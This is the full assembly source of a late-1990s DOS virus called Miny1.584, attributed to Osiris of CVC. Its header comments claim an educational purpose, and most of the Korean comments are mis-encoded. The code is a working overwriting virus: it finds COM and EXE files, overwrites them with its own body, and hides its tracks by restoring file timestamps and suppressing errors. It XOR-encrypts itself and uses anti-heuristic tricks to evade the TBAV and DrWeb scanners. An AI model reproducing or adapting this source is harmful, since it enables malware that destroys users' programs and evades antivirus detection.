;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;                                              \\\\\\\  \       \  \
;     Miny1.584                               \          \     \   \
;                 by Osiris / CVC             \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #01
;
;
; Name : Miny1.584
; AV Name : Miny, MinyO, KOV.Mini1
; Original Author : KOV of SVS
; Author : Osiris of CVC
; Origin : Corea
; Date : 1998/01/02
; Type : Non Resident  Overwriting
;
; !****************************************************************************!
; *                                                                            *
; * ‰w‰¡ !                                                                     *
; *    ·¡ˆõ·e ¤a·¡œá¯a ­¡¯a Å¡—a·¡”a. Ša·B¸â·¥ ¡¢¸â·a¡ e ¬a¶w–A´á´¡Ðe”a.      *
; *    ¹A¸b¸a“e ·¡ ­¡¯aÅ¡—a¡ ´¡‹¡–A“e ´á˜áÐe ¢…¹AµA ”Ð¬á•¡ À‚·±·i »¡»¡ ´g   *
; *    “e”a. ¥eÑw Ðaˆáa ¯©Ð—Ða»¡  iœa !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify & execute it !                                        *
; *                                                                            *
; !****************************************************************************!
;
; Miny1.399 ¤a·¡œá¯a· ˆ¬åÌe·¡”a.
; Anti-Heuristic ·i ¬a¶wÐ¬á ·¥‰·»¡“w ˆñ¬‚µA¬á•¡ »¥”e–A»¡ ´g“e”a.
; Ða»¡ e, ˆeÑ¢ EXE Ìa·©·i ˆqµq¯¡Åv·i ‰w¶ ÑÂ¸w¸aµÁ Ìa·© Š¹¡ˆa Ëia¬á ·¯±¯aœó”a
; ‰¡ »¥”e–A‹¡•¡ Ðe”a. ·¡ˆå ‰sÁa³a‹¡Ñw ¤a·¡œá¯a ·¡£a¡ ´á¼é ®ˆa ´ô”a.
;
; AV Test : »¥”e ´e–Q
; Heuristic Test : »¥”e ´e–Q
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>


 Miny1         SEGMENT PARA 'Miny1'
               assume cs:Miny1, ds:Miny1

               Org    100h

 Entry:        call   Anti_TBAV                 ; TBAV »¥”e ¤wÐ & ´qÑ¡ Î‰‹¡

 Encry_Start:
               mov    byte ptr S_Find,0FFh      ; COM ˆqµq·¥ˆa, EXE ˆqµq·¥ˆa
               mov    byte ptr Total,00         ; 3ˆ ˆqµq
               mov    byte ptr Infected,00      ; ˆqµq–E ˆ•®Ÿi 0 ·a¡ Ðe”a.
               Jmp    Virus_Start               ; Ìa·© Àx‹¡¡ ¸ñÏa

;
; •A·¡Èá ˆt µwµb
;

 Vir_Msg       db ' [Miny1]  from Corean Virus Factory !',0Dh,0Ah
               db ' Anti-Heuristic Version / FREEWARE  98/01/02',0Dh,0Ah
               db ' (c) Copyleft 1991-95 by KOV of SVS,Corea',0Dh,0Ah
               db ' (c) Copyleft 1997-98 by Osiris of CVC,Corea',0Dh,0Ah
               db ' Thanx to MOV of SVS !$'

 Msg           DB     'Abnormal Program Termination.',0Dh,0Ah,'$'

 Total         DB     ?                         ; ˆqµq¯¡Ç¥®
 Infected      DB     ?                         ; »¡‹qŒa»¡ ˆqµq–E Ìa·©—i
 S_Find        DB     ?                         ; ˆqµq¯¡Ç¡‰¡ ·¶“e ¬wÈ
 UP            DB     '..',00                   ; ¬w¶á¡ ·¡•·

 Virus_Start:
               xor    ax,ax
               mov    ds,ax
               mov    bx,0090h
               push   DS:[BX]                   ; Int 24h ˆt ¸á¸w
               Push   DS:[BX+2]

               mov    DS:[BX],offset NewInt24
               mov    DS:[BX+2h],cs             ; Int 24h ˆa¡À‘

               Push   CS                        ; cs=ds
               Pop    DS

               mov    word ptr Target_File, '.*'; *. ¸á¸w
                                                ; ´a¢ ˆt·¡a Ìa·© Àx‹¡
                                                ; Anti-Heuristic for DrWeb
 Find_File:
               Mov    ah, (4Eh xor 12h)
               Mov    cx,00100011B              ; Ìa·© ­¢¬÷
               mov    dx, offset Target_File
 Find:         xor    ah,12h
               Int    21h                       ; Àõ Ìa·© Àx‹¡“e ¯©Ìˆa–E”a.
               Jnc    ChkInfect                 ; µAœá?
               jmp    Check_S_Find
 ChkInfect:
               mov    ax, DS:[0080h+1Eh]
               cmp    ax,'OC'                   ; COMMAND.COM ·¥ˆa ?
               jnz    InfectFile                ; ˆqµq ¹A¶A

 Find_NEXT:
               Mov    ah, (4Fh xor 12h)         ; ”a·q Ìa·© ˆñ¬a
               JMP    Find                      ;

 InfectFile:
               mov    ax,0143h                  ; ­¢¬÷·i ·ª‹¡/³a‹¡¡  e—e”a.
               xor    cx,cx                     ; DTA ˆa 0080h ¦Èá ¯¡¸bÐa£a¡
               mov    dx,0080h
               add    dl,1Eh                    ; DX=009Eh
               xchg   ah,al
               int    21h
               jc     Stop_Virus

               mov    ax,023Dh                  ; µ¡Ïe/³a‹¡¡ µ¡Ïe
               xchg   ah,al                     ; AX=3D02h
               int    21h
               jc     Stop_Virus

               xchg   ax,bx                     ; AX µA Ð…—i ý‹¡
               mov    ax,(5700h xor 5700h)      ; ¯¡ˆe ´è‹¡
               xor    ax,5700h
               int    21h
               push   cx
               push   dx

               mov    ah,3Fh                    ; ´|¦¦… ·ª´á —i·¡‹¡
               mov    cx,0001
               mov    dx, offset Buffer
               int    21h

               mov    ax,4200h
               xor    cx,cx
               xor    dx,dx
               int    21h

               cmp    byte ptr Buffer, 0E8h     ; ˆqµq–A´öa ?
               jnz    Get_Key_Value
               inc    byte ptr INFECTED         ; ˆqµq–E Ìa·© ˆ•®
               jmp    Restore_File_DT

 Get_Key_Value:
               xor    ax,ax                     ; ·±·· ¯¡ˆe ´è‹¡ (´qÑ¡ÑÁ
               mov    es,ax                     ; µA ¬a¶w)
               mov    al,byte ptr ES:[046Ch]    ; 0000:046Ch
               Push   CS                        ; cs=es
               Pop    ES                        ;
               mov    Key_Value,al              ; Key_Value = ´qÑ¡Ç¡ ˆt
               call   Write_Vir                 ; ¤a·¡œá¯a ³a‹¡ Ñ¡Â‰
               Inc    byte ptr Total            ; 1 »wˆa

 Restore_File_DT:
               pop    dx                        ; ¯¡ˆe ¥¢Š
               pop    cx
               mov    ax,0157h                  ; ¯¡ˆe ¹¡¸÷(¶¥œ ¯¡ˆe)
               xchg   ah,al                     ; AX=5701h
               int    21h

               mov    ah,3eh                    ; Ìa·© ”h‹¡
               Int    21h

               cmp    byte ptr Total,3          ; 3ˆ ˆqµq¯¡Åva?
               jz     Stop_Virus
               JMP    Find_NEXT

 Stop_Virus:
               xor    ax,ax                     ; ¶¥œ Int 24h ¡ ¤aŽ‘
               mov    ds,ax
               mov    bx,0090h
               pop    DS:[BX+2]
               pop    DS:[BX]
               Push   CS
               Pop    DS
               mov    dx, offset Msg            ; ¸÷¬w¸â·¥ µAœá¡ ˆa¸w
               cmp    byte ptr Infected,15      ; 15ˆ·¡¬w ˆqµq–E Ìa·©·¡ ·¶·a¡e
               jb     PrtMsg                    ; ¡A¯¡»¡ Â‰b

               mov    dx, offset Vir_Msg
 PrtMsg:       mov    ah,9                      ; ¡A¯¡»¡ Â‰b
               Int    21h

               Mov    ax,4CFFh                  ; ¤a·¡œá¯a ¹·ža
               int    21h


 Check_S_Find:
               cmp    byte ptr S_Find, 0FFh     ; ´a¢ Ìa·©·¡a Àx´v“eˆa ?
               jnz    Check_Find_com
 Find_Com:
               mov    byte ptr S_Find, 0        ; COM Ìa·© ¦Èá ˆqµq
               mov    word ptr Target_File+2,'oc'
               mov    byte ptr Target_File+4,'m'
               mov    byte ptr Target_File+5, 0 ; *.com
               jmp    Find_File

 Check_Find_com:
               cmp    byte ptr S_Find,1         ; 01·¡¡e EXE Ìa·©•¡ ˆqµq¯¡Åv”a.
               Jnz    DX_EXE
               mov    dx, offset UP             ; ¬w¶á —¡BÉ¡Ÿ¡¡ ·¡•·
               mov    ah, 3Bh
               Int    21h
               jc     Stop_Virus                ; žËa —¡BÉ¡Ÿ¡ ·¥ˆa ?
               jmp    Find_Com
 DX_EXE:
               Mov    byte ptr S_Find,1         ; EXE Ìa·©·i ˆqµq¯¡Åaœa.
               mov    word ptr Target_File+2,'xe';
               mov    byte ptr Target_File+4,'e'
               mov    byte ptr Target_File+5, 0 ; *.exe
               Jmp    Find_File

 NewInt24:                                      ; Int 24h ÀáŸ¡
               xor    al,al
               IRET

 End_Encry:

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;             ¤a·¡œá¯a ´qÑ¡ÑÁ ¦¦…
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 Write_Vir:    call   Decode                    ; ´qÑ¡ÑÁ
               mov    ah, 3Fh                   ; ¤a·¡œá¯a ³a‹¡
               inc    ah                        ; AH=40h
               mov    dx, 100h                  ;
               mov    cx, offset Vir_END - 100h ;
               Int    21h
               call   Decode                    ; ´qÑ¡ Ð¹A
               RET
 Key_Value     DB     ?

 Anti_TBAV:
               cmp    al,100                    ; Thanx ! MOV !
               je     Decode                    ; TBAV · '#' Ïiœ‹aˆa ¤i¬—Ða»¡
               inc    al                        ; ´g“e”a.
               loop   Anti_TBAV                 ;
 Decode:
               mov    di, offset Encry_Start    ; ´qÑ¡ ¯¡¸b¸ñ
               mov    ah, Key_value
               mov    si,di
               mov    cx, offset End_Encry - Encry_Start
 E_Ing:
               lodsb                            ; ´qÑ¡ÑÁ
               xor    al,ah
               stosb
               loop   E_ing
               RET
 Vir_END:

 Target_File   db     0,0,0,0,0,0               ; ˆqµq·i ¯¡Ç© Ìa·© ÑÂ¸w¸a
 Buffer        db     ?

 Miny1         ENDS
               END    Entry
